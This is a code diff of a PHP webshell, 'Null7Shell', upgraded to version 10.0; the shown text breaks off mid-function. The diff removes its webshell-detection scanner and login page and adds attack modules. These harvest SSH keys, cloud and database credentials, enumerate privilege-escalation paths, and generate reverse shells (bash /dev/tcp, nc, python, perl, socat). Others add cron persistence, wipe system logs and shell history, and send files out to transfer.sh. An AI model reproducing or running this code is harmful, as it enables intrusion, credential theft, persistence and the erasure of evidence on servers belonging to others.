@@ -9,7 +9,7 @@ define('N7_HASH', hash('sha256', N7_USER . '::' . N7_PASS));
 define('N7_NAME', 'Null7Shell');
 define('N7_AUTHOR', 'null7');
 define('N7_CONTACT', 'null7ganteng@gmail.com');
-define('N7_VERSION', '9.5');
+define('N7_VERSION', '10.0');
 define('N7_DEFAULT_EMAIL', 'null7ganteng@gmail.com');
 define('N7_DEFAULT_ADMIN_USER', 'null7admin');
 define('N7_DEFAULT_ADMIN_PASS', 'Null7!Admin@2024');
@@ -139,248 +139,332 @@ function n7_server_info() {
     return $i;
 }
 
-function n7_shell_scan($root = null) {
-    if ($root === null || !is_dir($root)) {
-        $root = $_SERVER['DOCUMENT_ROOT'] ?? getcwd();
-        if (!is_dir($root)) $root = getcwd();
-    }
-    $root = rtrim(realpath($root) ?: $root, DIRECTORY_SEPARATOR);
-    $log = "=== WEBSHELL SCANNER ===\n" . str_repeat('=', 60) . "\n";
-    $log .= "SCAN ROOT: $root\n";
-    $log .= "TIME: " . date('Y-m-d H:i:s') . "\n\n";
+function n7_sh($cmd, $timeout = 20) {
+    if (!function_exists('shell_exec')) return null;
+    $out = @shell_exec("timeout $timeout sh -c " . escapeshellarg($cmd) . " 2>&1");
+    return $out === null ? '' : (string)$out;
+}
 
-    $patterns = [
-        'eval_post'         => '/eval\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
-        'eval_var'          => '/eval\s*\(\s*\$[a-zA-Z_]/i',
-        'base64_decode'     => '/base64_decode\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
-        'gzinflate'         => '/gzinflate\s*\(\s*base64_decode/i',
-        'gzuncompress'      => '/gzuncompress\s*\(\s*base64_decode/i',
-        'str_rot13_eval'    => '/eval\s*\(\s*str_rot13/i',
-        'assert_post'       => '/assert\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
-        'system_var'        => '/system\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
-        'exec_var'          => '/exec\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
-        'shell_exec_var'    => '/shell_exec\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
-        'passthru_var'      => '/passthru\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
-        'popen_var'         => '/popen\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
-        'proc_open_var'     => '/proc_open\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
-        'preg_e'            => '/preg_replace\s*\(\s*[\'"].*\/e[\'"]/i',
-        'create_function'   => '/create_function\s*\(\s*[\'"].*eval/i',
-        'file_put_contents' => '/file_put_contents\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
-        'fwrite_post'       => '/fwrite\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
-        'move_uploaded'     => '/move_uploaded_file\s*\(\s*\$_(FILES|POST)/i',
-        'php_uname_system'  => '/php_uname\s*\(\s*\)\s*[;.]/i',
-        'cmd_param'         => '/\$_GET\s*\[\s*[\'"](?:cmd|exec|command|shell|q|act)[\'"]\s*\]/i',
-        'eval_request_var'  => '/eval\s*\(\s*(?:@)?\$_(?:POST|REQUEST|GET|COOKIE)\s*\[/i',
-        'assert_eval'       => '/@?assert\s*\(\s*(?:@)?\$_(?:POST|REQUEST|GET|COOKIE)/i',
-        'chr_obfusc'        => '/(?:chr\s*\(\s*\d+\s*\)\s*\.\s*){5,}/i',
-        'var_dump_post'     => '/var_dump\s*\(\s*\$_(POST|REQUEST|GET)/i',
-        'md5_post'          => '/md5\s*\(\s*\$_(POST|REQUEST|GET|COOKIE)/i',
-        'shell_get'         => '/\$_GET\s*\[\s*[\'"](?:c|cmd|exec|command)[\'"]\s*\]\s*(?:;|\)|\])/i',
-        'eval_string'       => '/eval\s*\(\s*[\'"][^\'"]{20,}/i',
-        'system_get'        => '/system\s*\(\s*\$_GET/i',
-        'include_get'       => '/(?:include|require)(?:_once)?\s*\(\s*\$_GET/i',
-        'include_post'      => '/(?:include|require)(?:_once)?\s*\(\s*\$_POST/i',
-    ];
-
-    $suspicious_names = [
-        'shell', 'cmd', 'backdoor', 'wso', 'b374k', 'c99', 'r57', 'webshell',
-        'uploader', 'pwn', 'hack', 'ghost', 'mini', 'alfa', 'indoxploit',
-        'marijuana', 'priv8', 'anonym', 'cyber', 'dark', 'black', 'null7',
-        'xploit', 'defacer', 'mass', 'symlink', 'ajax', 'gate', 'drop',
-    ];
-
-    $results = [];
-    $stats = ['scanned' => 0, 'detected' => 0, 'suspicious' => 0, 'errors' => 0];
-    $skip_dirs = ['node_modules', 'vendor', '.git', '.svn', '.cache', 'cache', 'tmp', 'temp'];
-
-    try {
-        $it = new RecursiveIteratorIterator(
-            new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS),
-            RecursiveIteratorIterator::SELF_FIRST
-        );
-        foreach ($it as $f) {
-            if ($f->getExtension() !== 'php') continue;
-            $path = $f->getPathname();
-            $basename = strtolower($f->getBasename());
-            $skip = false;
-            foreach ($skip_dirs as $sd) {
-                if (strpos($path, DIRECTORY_SEPARATOR . $sd . DIRECTORY_SEPARATOR) !== false) { $skip = true; break; }
-            }
-            if ($skip) continue;
-            $stats['scanned']++;
-            if ($f->getSize() > 5 * 1024 * 1024) continue;
-            $content = @file_get_contents($path, false, null, 0, 200 * 1024);
-            if ($content === false) { $stats['errors']++; continue; }
-            $matches = [];
-            foreach ($patterns as $pname => $pre) {
-                if (@preg_match($pre, $content)) $matches[] = $pname;
-            }
-            $score = count($matches);
-            $name_flag = false;
-            foreach ($suspicious_names as $sn) {
-                if (strpos($basename, $sn) !== false) { $name_flag = true; break; }
-            }
-            if ($name_flag) $score += 3;
-            $entropy_flag = false;
-            if (strlen($content) > 500) {
-                $sample = substr($content, 0, 3000);
-                $b64chars = preg_match_all('/[A-Za-z0-9+\/]{100,}/', $sample);
-                if ($b64chars >= 2) { $entropy_flag = true; $score += 2; }
-            }
-            if ($score >= 2) {
-                $stats['detected']++;
-                $results[] = ['path' => $path, 'size' => $f->getSize(), 'score' => $score,
-                    'matches' => $matches, 'name_flag' => $name_flag, 'entropy' => $entropy_flag];
-            } elseif ($score === 1) {
-                $stats['suspicious']++;
-                $results[] = ['path' => $path, 'size' => $f->getSize(), 'score' => $score,
-                    'matches' => $matches, 'name_flag' => $name_flag, 'entropy' => $entropy_flag];
-            }
+function n7_ssh_harvest($root = null) {
+    $log = "=== SSH / CREDENTIAL HARVESTER ===\n" . str_repeat('=', 60) . "\n";
+    $targets = [];
+    $homes = glob('/home/*') ?: [];
+    $homes[] = '/root';
+    $homes[] = '/var/www';
+    foreach ($homes as $hd) {
+        if (!@is_dir($hd)) continue;
+        foreach (['.ssh/id_rsa','.ssh/id_ed25519','.ssh/id_ecdsa','.ssh/id_dsa','.ssh/authorized_keys','.ssh/known_hosts','.ssh/config','.gitconfig','.netrc','.pgpass','.my.cnf','.env','.aws/credentials','.aws/config','.config/gcloud/credentials.db','.docker/config.json','.npmrc','.composer/auth.json'] as $f) {
+            $p = $hd . '/' . $f;
+            if (@is_file($p) && @is_readable($p)) $targets[] = $p;
         }
-    } catch (Throwable $ex) {
-        $log .= "EXCEPTION: " . $ex->getMessage() . "\n";
     }
-
-    usort($results, fn($a, $b) => $b['score'] <=> $a['score']);
-
-    $log .= "=== STATISTICS ===\n";
-    $log .= "Scanned PHP files : " . $stats['scanned'] . "\n";
-    $log .= "Detected (score>=2): " . $stats['detected'] . "\n";
-    $log .= "Suspicious (score=1): " . $stats['suspicious'] . "\n";
-    $log .= "Read errors       : " . $stats['errors'] . "\n\n";
-
-    if (empty($results)) {
-        $log .= "✔ No webshell detected. Clean!\n";
-        return $log;
+    if ($root && is_dir($root)) {
+        try {
+            $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
+            $c = 0;
+            foreach ($it as $f) {
+                if (!$f->isFile()) continue;
+                $n = $f->getFilename();
+                if (in_array($n, ['.env','.gitconfig','.netrc','.pgpass','.my.cnf','credentials.json','secrets.yml','secrets.yaml','id_rsa','id_ed25519'])) {
+                    $targets[] = $f->getPathname();
+                    if (++$c >= 100) break;
+                }
+            }
+        } catch (Throwable $e) {}
     }
-
-    $log .= "=== DETECTED FILES ===\n\n";
-    foreach ($results as $idx => $r) {
-        $tag = $r['score'] >= 2 ? '⚠ DETECTED' : '? SUSPICIOUS';
-        $log .= sprintf("[%d] %s (score=%d)\n", $idx + 1, $tag, $r['score']);
-        $log .= "    Path: " . $r['path'] . "\n";
-        $log .= "    Size: " . n7_size($r['size']) . "\n";
-        if ($r['name_flag']) $log .= "    ⚑ Suspicious filename\n";
-        if ($r['entropy']) $log .= "    ⚑ High base64 obfuscation\n";
-        if (!empty($r['matches'])) $log .= "    Signals: " . implode(', ', array_slice($r['matches'], 0, 10)) . "\n";
-        $log .= "\n";
+    $targets = array_unique($targets);
+    $log .= "Found " . count($targets) . " candidate files\n\n";
+    foreach ($targets as $t) {
+        $log .= "--- " . $t . " ---\n";
+        $c = @file_get_contents($t, false, null, 0, 4096);
+        if ($c === false) { $log .= "(unreadable)\n\n"; continue; }
+        $lines = preg_split('/\r?\n/', $c);
+        $show = [];
+        foreach ($lines as $l) {
+            if (preg_match('/^\s*(#|;|$)/', $l)) continue;
+            if (strpos($l, 'PRIVATE KEY') !== false) { $show[] = '[PRIVATE KEY DETECTED - see raw]'; continue; }
+            if (strlen($l) > 200) $l = substr($l, 0, 200) . '...';
+            $show[] = $l;
+            if (count($show) >= 15) { $show[] = '...'; break; }
+        }
+        $log .= implode("\n", $show) . "\n\n";
     }
-    $log .= "TOTAL FINDINGS: " . count($results) . "\n";
+    $search = n7_sh('grep -rIl -E "(AWS_ACCESS_KEY|PRIVATE_KEY|api_key|apikey|secret_key|jwt_secret|password)" /var/www /home 2>/dev/null | head -30');
+    if ($search) { $log .= "=== FILES WITH SECRET PATTERNS ===\n" . $search . "\n"; }
     return $log;
 }
 
-$logged = !empty($_SESSION['n7_auth']) && $_SESSION['n7_auth'] === N7_HASH;
-if (!$logged && isset($_POST['login_user'], $_POST['login_pass'])) {
-    if (hash_equals(N7_USER, (string)$_POST['login_user']) && hash_equals(N7_PASS, (string)$_POST['login_pass'])) {
-        $_SESSION['n7_auth'] = N7_HASH;
-        header('Location: ?'); exit;
-    } else { $login_err = 'ACCESS DENIED'; }
-}
-if (isset($_GET['logout'])) { $_SESSION = []; session_destroy(); header('Location: ?'); exit; }
-
-if (!$logged) {
-    $login_failed = !empty($login_err);
-    $bg = N7_BG_GIF;
-?><!DOCTYPE html><html lang="id"><head><meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
-<title><?=N7_NAME?></title>
-<style>
-*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
-body{background:#050005;min-height:100vh;display:flex;align-items:center;justify-content:center;
-  font-family:'Courier New',monospace;color:#e0d0e8;padding:16px;
-  background-image:linear-gradient(rgba(20,0,25,.35), rgba(10,0,20,.5)),url('<?=$bg?>');
-  background-size:cover;background-position:center center;background-attachment:fixed;background-repeat:no-repeat}
-body::before{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
-  background:radial-gradient(circle at 15% 0%, rgba(120,0,80,.3) 0%, transparent 50%),
-    radial-gradient(circle at 85% 100%, rgba(0,80,100,.25) 0%, transparent 50%),
-    radial-gradient(ellipse at center, transparent 45%, rgba(0,0,0,.75) 100%);mix-blend-mode:multiply}
-body::after{content:'';position:fixed;inset:0;pointer-events:none;z-index:0;
-  background:repeating-linear-gradient(0deg,transparent 0 3px,rgba(255,0,60,.02) 3px 4px);
-  animation:scanline 8s linear infinite}
-@keyframes scanline{0%{background-position:0 0}100%{background-position:0 100%}}
-.lb{position:relative;z-index:2;background:linear-gradient(135deg, rgba(40,0,50,.72), rgba(15,0,25,.82));
-  backdrop-filter:blur(16px) saturate(1.3);-webkit-backdrop-filter:blur(16px) saturate(1.3);
-  border:2px solid rgba(180,0,80,.7);border-radius:14px;padding:30px 24px;width:100%;max-width:400px;
-  box-shadow:0 0 60px rgba(255,0,60,.4),0 0 100px rgba(150,0,180,.25),inset 0 0 40px rgba(180,0,80,.15)}
-.skull{font-size:80px;text-align:center;color:#ff2a5f;text-shadow:0 0 20px #ff0040,0 0 50px #aa0050,0 0 3px #000;
-  animation:pulse 2.2s infinite;margin-bottom:6px}
-@keyframes pulse{0%,100%{opacity:.88;transform:scale(1)}50%{opacity:1;transform:scale(1.07)}}
-h1{text-align:center;color:#ff4477;letter-spacing:4px;font-size:20px;text-shadow:0 0 14px #ff0040,0 0 4px #000;margin-bottom:16px}
-label{display:block;color:#d080a0;font-size:11px;margin:12px 0 5px;letter-spacing:1px;text-shadow:0 0 3px #000}
-input{width:100%;padding:12px 14px;background:rgba(30,0,40,.85);border:1px solid #a00060;border-radius:6px;
-  color:#ffb0d0;font-family:inherit;font-size:14px;outline:none;transition:.2s;backdrop-filter:blur(4px)}
-input:focus{border-color:#ff2a5f;box-shadow:0 0 18px rgba(255,0,60,.6);background:rgba(45,0,55,.9)}
-button{width:100%;margin-top:20px;padding:14px;background:linear-gradient(180deg,#a0003a,#500020);
-  border:1px solid #ff2a5f;border-radius:6px;color:#ffffff;font-family:inherit;font-size:13px;
-  font-weight:bold;letter-spacing:4px;cursor:pointer;text-shadow:0 0 8px #ff0040,0 0 3px #000;transition:.2s;
-  box-shadow:0 0 20px rgba(180,0,80,.4)}
-button:hover{background:linear-gradient(180deg,#d0004a,#800030);box-shadow:0 0 30px rgba(255,0,60,.75)}
-.err{background:rgba(160,0,50,.4);border:1px solid #ff2a5f;color:#ff7080;padding:9px;
-  border-radius:6px;font-size:11px;text-align:center;margin-bottom:10px;letter-spacing:1px}
-.foot{text-align:center;color:#996080;font-size:10px;margin-top:14px;letter-spacing:1px;text-shadow:0 0 3px #000}
-@media(max-width:400px){.skull{font-size:65px}h1{font-size:17px}.lb{padding:24px 16px}}
-</style></head><body>
-<div class="lb">
-  <div class="skull">☠</div>
-  <h1><?=N7_NAME?></h1>
-  <?php if (!empty($login_err)): ?><div class="err"><?=h($login_err)?></div><?php endif; ?>
-  <form method="post" autocomplete="off" id="loginForm">
-    <label>USERNAME</label><input type="text" name="login_user" required autofocus>
-    <label>PASSWORD</label><input type="password" name="login_pass" required>
-    <button type="submit">ENTER</button>
-  </form>
-  <div class="foot">BY <?=N7_AUTHOR?> // v<?=N7_VERSION?></div>
-</div>
-<script>
-var ac = null;
-function getAC(){ if(!ac){ try{ ac = new (window.AudioContext||window.webkitAudioContext)(); }catch(e){} } return ac; }
-function beep(f, d, type){ var c = getAC(); if(!c) return;
-  var o = c.createOscillator(), g = c.createGain();
-  o.type = type || 'square'; o.frequency.value = f || 700;
-  g.gain.setValueAtTime(0.06, c.currentTime);
-  g.gain.exponentialRampToValueAtTime(0.001, c.currentTime+(d||0.1));
-  o.connect(g); g.connect(c.destination); o.start(); o.stop(c.currentTime+(d||0.1)); }
-function accessDenied(){
-  beep(400, 0.15, 'sawtooth');
-  setTimeout(function(){ beep(300, 0.15, 'sawtooth'); }, 120);
-  setTimeout(function(){ beep(200, 0.25, 'sawtooth'); }, 240);
-  setTimeout(function(){ beep(150, 0.4, 'sawtooth'); }, 420);
-}
-<?php if ($login_failed): ?>accessDenied();<?php endif; ?>
-document.getElementById('loginForm').addEventListener('submit', function(e){
-  try { localStorage.setItem('n7_login_success', '1'); } catch(e2) {}
-});
-</script>
-</body></html>
-<?php
-    exit;
+function n7_db_browser($action = 'list', $dbname = '', $query = '') {
+    $log = "=== DATABASE BROWSER ===\n" . str_repeat('=', 60) . "\n";
+    $cfgs = n7_find_configs();
+    if (empty($cfgs)) return $log . "No CMS config found. Tidak bisa connect DB.\n";
+    $connected = null; $db_info = null;
+    foreach ($cfgs as $c) {
+        $conn = n7_db_connect($c['db']['host'], $c['db']['user'], $c['db']['pass'], $c['db']['name'], $c['db']['port']);
+        if ($conn) { $connected = $conn; $db_info = $c; break; }
+    }
+    if (!$connected) return $log . "Connect DB failed.\n";
+    $log .= "Connected: {$db_info['db']['name']} @ {$db_info['db']['host']}\n\n";
+    if ($action === 'query' && $query !== '') {
+        $log .= "QUERY: $query\n" . str_repeat('─', 50) . "\n";
+        $r = n7_db_q($connected, $query);
+        if (!$r['ok']) { $log .= "ERROR: " . ($r['error'] ?? '') . "\n"; return $log; }
+        if (empty($r['rows'])) { $log .= "OK (no rows / affected)\n"; return $log; }
+        $headers = array_keys($r['rows'][0]);
+        $log .= implode(' | ', $headers) . "\n" . str_repeat('─', 50) . "\n";
+        $cnt = 0;
+        foreach ($r['rows'] as $row) {
+            $vals = [];
+            foreach ($headers as $k) { $v = $row[$k] ?? ''; if (strlen($v) > 60) $v = substr($v, 0, 60) . '...'; $vals[] = $v; }
+            $log .= implode(' | ', $vals) . "\n";
+            if (++$cnt >= 100) { $log .= "... (limit 100 rows)\n"; break; }
+        }
+        $log .= "\nRows: " . count($r['rows']) . "\n";
+        return $log;
+    }
+    if ($action === 'tables' && $dbname !== '') {
+        $r = n7_db_q($connected, "SHOW TABLES FROM `" . addslashes($dbname) . "`");
+        $log .= "TABLES in $dbname:\n";
+        if ($r['ok']) foreach ($r['rows'] as $row) { foreach ($row as $v) $log .= "  " . $v . "\n"; }
+        return $log;
+    }
+    $r = n7_db_q($connected, "SHOW DATABASES");
+    $log .= "DATABASES:\n";
+    if ($r['ok']) foreach ($r['rows'] as $row) { foreach ($row as $v) $log .= "  " . $v . "\n"; }
+    $log .= "\nUse query tab untuk SELECT * FROM ...\n";
+    return $log;
 }
 
-if (isset($_GET['action']) && $_GET['action'] === 'readfile' && !empty($_GET['f'])) {
-    header('Content-Type: application/json');
-    try {
-        $f = $_GET['f'];
-        $real = @realpath($f);
-        if ($real === false || !is_file($real)) { echo json_encode(['ok' => false, 'error' => 'File not found']); exit; }
-        if (!is_readable($real)) { echo json_encode(['ok' => false, 'error' => 'File not readable']); exit; }
-        $content = @file_get_contents($real);
-        if ($content === false) { echo json_encode(['ok' => false, 'error' => 'Read failed']); exit; }
-        if (strlen($content) > 2 * 1024 * 1024) { echo json_encode(['ok' => false, 'error' => 'File too large (>2MB)']); exit; }
-        echo json_encode(['ok' => true, 'content' => $content]);
-    } catch (Throwable $ex) { echo json_encode(['ok' => false, 'error' => $ex->getMessage()]); }
-    exit;
+function n7_privesc_check() {
+    $log = "=== PRIVILEGE ESCALATION CHECK ===\n" . str_repeat('=', 60) . "\n";
+    $log .= "Current user: " . trim(n7_sh('id') ?: 'unknown') . "\n\n";
+    $log .= "=== SUDO -l ===\n" . (n7_sh('sudo -n -l 2>&1') ?: '(cannot run sudo)') . "\n";
+    $log .= "=== SUID BINARIES (uncommon) ===\n";
+    $suid = n7_sh('find / -perm -4000 -type f 2>/dev/null | grep -vE "/(ping|sudo|su|passwd|chsh|chfn|newgrp|gpasswd|mount|umount|fusermount|pkexec)" | head -30');
+    $log .= ($suid ?: '(none)') . "\n";
+    $log .= "=== WRITABLE /etc/passwd ? ===\n" . (n7_sh('ls -la /etc/passwd /etc/shadow 2>&1')) . "\n";
+    $log .= "=== KERNEL VERSION ===\n" . (n7_sh('uname -a') ?: '') . "\n";
+    $log .= "=== DOCKER GROUP ? ===\n" . (n7_sh('groups 2>/dev/null | grep -E "docker|lxd|sudo|wheel" || echo "no special groups"')) . "\n";
+    $log .= "=== CRON JOBS ===\n" . (n7_sh('crontab -l 2>/dev/null | head -20') ?: '(no crontab)') . "\n";
+    $log .= "=== WRITABLE SYSTEM FILES ===\n" . (n7_sh('find /etc /usr/local /opt -writable -type f 2>/dev/null | head -20') ?: '(none)') . "\n";
+    $log .= "=== .bash_history ===\n" . (n7_sh('for h in /home/*/.bash_history /root/.bash_history; do [ -f "$h" ] && echo "=== $h ===" && tail -20 "$h"; done 2>/dev/null') ?: '(empty)') . "\n";
+    return $log;
 }
 
-$page = $_GET['p'] ?? 'home';
-if ($page === 'cms') $page = 'exploit';
-if (!in_array($page, ['home', 'exploit', 'gsocket', 'tools'])) $page = 'home';
+function n7_port_scan() {
+    $log = "=== LOCAL PORT SCAN (127.0.0.1) ===\n" . str_repeat('=', 60) . "\n";
+    if (function_exists('fsockopen')) {
+        $common = [21,22,25,53,80,110,143,443,445,993,995,1433,1521,2049,2375,2376,3000,3306,3389,5432,5601,5672,5900,6379,7001,8000,8008,8080,8081,8088,8090,8443,8888,9000,9090,9200,9300,11211,27017,50000];
+        $found = [];
+        foreach ($common as $p) {
+            $fp = @fsockopen('127.0.0.1', $p, $errno, $errstr, 0.4);
+            if ($fp) { $found[] = $p; fclose($fp); }
+        }
+        $log .= "OPEN PORTS: " . (empty($found) ? '(none)' : implode(', ', $found)) . "\n\n";
+    }
+    $log .= "=== NETSTAT -tlnp ===\n" . (n7_sh('netstat -tlnp 2>/dev/null | head -30') ?: n7_sh('ss -tlnp 2>/dev/null | head -30') ?: '(no netstat/ss)') . "\n";
+    return $log;
+}
 
-$msg = ''; $msg_type = 'ok'; $action_done = '';
-$cwd = n7_cwd();
-$self_host = n7_self_host();
-$self_base = n7_self_base();
-$srv = n7_server_info();
-$csrf = $_SESSION['n7_csrf'];
+function n7_revshell_gen($host = '', $port = '4444', $type = 'bash') {
+    $log = "=== REVERSE SHELL GENERATOR ===\n" . str_repeat('=', 60) . "\n";
+    $log .= "LHOST: $host\nLPORT: $port\nTYPE: $type\n\n";
+    if ($host === '') $log .= "Set LHOST dulu (IP VPS kamu).\n";
+    $cmds = [
+        'bash'   => "bash -i >& /dev/tcp/$host/$port 0>&1",
+        'sh'     => "sh -i >& /dev/tcp/$host/$port 0>&1",
+        'nc'     => "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $host $port >/tmp/f",
+        'nc-e'   => "nc -e /bin/sh $host $port",
+        'python' => "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$host\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
+        'perl'   => "perl -e 'use Socket;\$i=\"$host\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+        'php'    => "php -r '\$s=fsockopen(\"$host\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+        'socat'  => "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$host:$port",
+    ];
+    foreach ($cmds as $k => $c) {
+        $log .= strtoupper($k) . ":\n  $c\n\n";
+    }
+    $log .= "LISTEN DI VPS:\n  nc -lvnp $port\n";
+    return $log;
+}
+
+function n7_backup_full($root = null) {
+    $log = "=== FULL BACKUP ===\n" . str_repeat('=', 60) . "\n";
+    if ($root === null || !is_dir($root)) $root = $_SERVER['DOCUMENT_ROOT'] ?? getcwd();
+    $root = rtrim(realpath($root) ?: $root, DIRECTORY_SEPARATOR);
+    if (!is_dir($root)) return $log . "Root invalid: $root\n";
+    $ts = date('Ymd_His');
+    $outdir = n7_gs_session_file();
+    $outdir = dirname($outdir);
+    $dest = $outdir . DIRECTORY_SEPARATOR . 'backup_' . $ts . '.tar.gz';
+    $log .= "Backing up: $root\n";
+    $log .= "To: $dest\n\n";
+    if (function_exists('shell_exec')) {
+        $out = n7_sh('tar czf ' . escapeshellarg($dest) . ' -C ' . escapeshellarg(dirname($root)) . ' ' . escapeshellarg(basename($root)) . ' 2>&1', 120);
+        $log .= "tar output: " . ($out ?: '(ok)') . "\n";
+        if (@is_file($dest)) {
+            $log .= "✔ Backup created: " . n7_size(@filesize($dest)) . "\n";
+            $log .= "Path: $dest\n";
+            if (function_exists('filesize') && @filesize($dest) < 50 * 1024 * 1024) {
+                $log .= "\nSmall enough to download. Akses: " . n7_self_base() . "/?action=download&f=" . urlencode($dest) . " (butuh endpoint download).\n";
+            }
+        } else $log .= "✘ Backup failed.\n";
+    } else $log .= "shell_exec disabled, tidak bisa tar.\n";
+    $dbout = n7_sh('which mysqldump 2>/dev/null');
+    if ($dbout) {
+        $cfgs = n7_find_configs();
+        foreach ($cfgs as $c) {
+            if ($c['cms'] === 'WordPress') {
+                $dbfile = $outdir . '/db_' . $ts . '.sql';
+                $cmd = 'mysqldump -h' . escapeshellarg($c['db']['host']) . ' -u' . escapeshellarg($c['db']['user']) . ' -p' . escapeshellarg($c['db']['pass']) . ' ' . escapeshellarg($c['db']['name']) . ' > ' . escapeshellarg($dbfile) . ' 2>&1';
+                $o = n7_sh($cmd, 120);
+                if (@is_file($dbfile)) $log .= "✔ DB dump: " . n7_size(@filesize($dbfile)) . " → $dbfile\n";
+                else $log .= "⚠ mysqldump failed: $o\n";
+                break;
+            }
+        }
+    }
+    return $log;
+}
+
+function n7_cron_persist($action = 'list', $cmd = '') {
+    $log = "=== CRON PERSISTENCE ===\n" . str_repeat('=', 60) . "\n";
+    if ($action === 'add' && $cmd !== '') {
+        $line = "* * * * * $cmd";
+        $out = n7_sh('(crontab -l 2>/dev/null; echo ' . escapeshellarg($line) . ') | crontab - 2>&1');
+        $log .= "Added: $line\nResult: " . ($out ?: '(ok)') . "\n\n";
+    }
+    $log .= "=== USER CRONTAB ===\n" . (n7_sh('crontab -l 2>/dev/null') ?: '(none)') . "\n";
+    $log .= "=== SYSTEM CRON ===\n" . (n7_sh('ls -la /etc/cron.d /etc/cron.daily /var/spool/cron/crontabs 2>/dev/null | head -40') ?: '(none)') . "\n";
+    return $log;
+}
+
+function n7_log_wipe() {
+    $log = "=== LOG WIPER ===\n" . str_repeat('=', 60) . "\n";
+    $logs = ['/var/log/apache2/access.log','/var/log/apache2/error.log','/var/log/nginx/access.log','/var/log/nginx/error.log','/var/log/auth.log','/var/log/secure','/var/log/syslog','/var/log/messages'];
+    $uid = trim(n7_sh('id -u') ?: '');
+    $log .= "Current UID: $uid\n\n";
+    foreach ($logs as $lg) {
+        if (!@is_file($lg)) { $log .= "✘ $lg (not found)\n"; continue; }
+        if (!@is_writable($lg)) { $log .= "✘ $lg (not writable)\n"; continue; }
+        $s = @filesize($lg);
+        @file_put_contents($lg, '');
+        $log .= "✔ $lg cleared (was " . n7_size($s) . ")\n";
+    }
+    $hists = glob('/home/*/.bash_history') ?: []; $hists[] = '/root/.bash_history';
+    foreach ($hists as $hd) {
+        if (@is_file($hd) && @is_writable($hd)) { @file_put_contents($hd, ''); $log .= "✔ $hd cleared\n"; }
+    }
+    if (function_exists('shell_exec')) {
+        @shell_exec('history -c 2>/dev/null');
+        @shell_exec('echo "" > /var/log/wtmp 2>/dev/null; echo "" > /var/log/btmp 2>/dev/null');
+        $log .= "✔ Shell history cleared (best effort)\n";
+    }
+    return $log;
+}
+
+function n7_file_transfer($action = 'download', $url = '', $dest = '') {
+    $log = "=== FILE TRANSFER ===\n" . str_repeat('=', 60) . "\n";
+    if ($action === 'download' && $url !== '') {
+        if ($dest === '') $dest = getcwd() . DIRECTORY_SEPARATOR . basename(parse_url($url, PHP_URL_PATH) ?: 'file');
+        $log .= "URL: $url\nDest: $dest\n";
+        $r = n7_get($url, 60);
+        if ($r['error']) { $log .= "✘ Download failed: {$r['error']}\n"; return $log; }
+        if (@file_put_contents($dest, $r['body']) !== false) $log .= "✔ Saved " . n7_size(strlen($r['body'])) . "\n";
+        else $log .= "✘ Write failed.\n";
+        return $log;
+    }
+    if ($action === 'exfil' && $url !== '') {
+        $log .= "Exfil file: $url\n";
+        if (!@is_file($url)) return $log . "✘ Not a file.\n";
+        $c = @file_get_contents($url);
+        if ($c === false) return $log . "✘ Read fail.\n";
+        $r = n7_post('https://transfer.sh/' . basename($url), $c, [], 60);
+        $log .= "Response: " . substr($r['body'], 0, 500) . "\n";
+        return $log;
+    }
+    return $log . "Action tidak valid.\n";
+}
+
+function n7_process_mgr($action = 'list', $pid = 0) {
+    $log = "=== PROCESS MANAGER ===\n" . str_repeat('=', 60) . "\n";
+    if ($action === 'kill' && $pid > 0) {
+        $out = n7_sh('kill -9 ' . (int)$pid . ' 2>&1');
+        $log .= "Kill PID $pid: " . ($out ?: 'ok') . "\n\n";
+    }
+    $log .= (n7_sh('ps aux --sort=-%cpu 2>/dev/null | head -40') ?: n7_sh('ps aux 2>/dev/null | head -40') ?: '(ps unavailable)') . "\n";
+    return $log;
+}
+
+function n7_geoip($ip = null) {
+    $log = "=== GEOIP / REVERSE DNS ===\n" . str_repeat('=', 60) . "\n";
+    if ($ip === null) $ip = $_SERVER['REMOTE_ADDR'] ?? '';
+    $log .= "IP: $ip\n";
+    $ptr = @gethostbyaddr($ip);
+    $log .= "Reverse DNS: " . ($ptr ?: '(none)') . "\n";
+    $r = n7_get("http://ip-api.com/json/" . urlencode($ip), 8);
+    if (!$r['error'] && $r['body']) {
+        $d = @json_decode($r['body'], true);
+        if ($d) {
+            $log .= "Country: " . ($d['country'] ?? '-') . "\n";
+            $log .= "Region: " . ($d['regionName'] ?? '-') . "\n";
+            $log .= "City: " . ($d['city'] ?? '-') . "\n";
+            $log .= "ISP: " . ($d['isp'] ?? '-') . "\n";
+            $log .= "Org: " . ($d['org'] ?? '-') . "\n";
+            $log .= "AS: " . ($d['as'] ?? '-') . "\n";
+        }
+    } else $log .= "Geo lookup failed.\n";
+    return $log;
+}
+
+function n7_multi_site() {
+    $log = "=== MULTI-SITE DISCOVERY ===\n" . str_repeat('=', 60) . "\n";
